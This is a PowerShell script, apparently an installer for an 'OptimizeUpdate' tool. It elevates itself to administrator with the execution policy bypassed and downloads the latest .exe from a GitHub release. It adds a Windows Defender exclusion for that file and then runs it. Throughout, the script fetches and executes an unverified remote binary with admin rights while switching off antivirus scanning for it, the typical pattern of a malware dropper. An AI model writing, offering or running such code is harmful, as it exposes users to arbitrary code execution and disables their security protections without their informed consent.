# ================= TLS 1.2 =================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ================= ADMIN CHECK =================
function Test-Admin {
    $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    Start-Process powershell `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" `
        -Verb RunAs
    exit
}

# ================= VARIABLES =================
$owner = "mggons93"
$repo  = "OptimizeUpdate"

# ================= OBTENER ÚLTIMA RELEASE =================
$release = Invoke-RestMethod "https://api.github.com/repos/$owner/$repo/releases/latest"

# ================= BUSCAR EL ARCHIVO .EXE =================
$asset = $release.assets | Where-Object { $_.name -like "*.exe" }

if (-not $asset) {
    Write-Error "No se encontró el ejecutable en la última release"
    exit 1
}

# ================= DEFINIR RUTA DE DESCARGA =================
# Guardar en la carpeta del usuario (C:\Users\[Usuario]\)
$exePath = Join-Path -Path $env:USERPROFILE -ChildPath $asset.name

Write-Output "Descargando $($asset.name)..."
Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $exePath -UseBasicParsing

# ================= EXCEPCIÓN PARA WINDOWS DEFENDER =================
# Esto agrega una excepción para el ejecutable descargado en Windows Defender
# Requiere permisos de administrador
try {
    Add-MpPreference -ExclusionPath $exePath
    Write-Output "Excepción de Windows Defender añadida para $exePath"
} catch {
    Write-Warning "No se pudo agregar la excepción de Windows Defender. Ejecuta manualmente si es necesario."
}

# ================= EJECUTAR EL PROGRAMA =================
Write-Output "Ejecutando $($asset.name)..."
Start-Process -FilePath $exePath
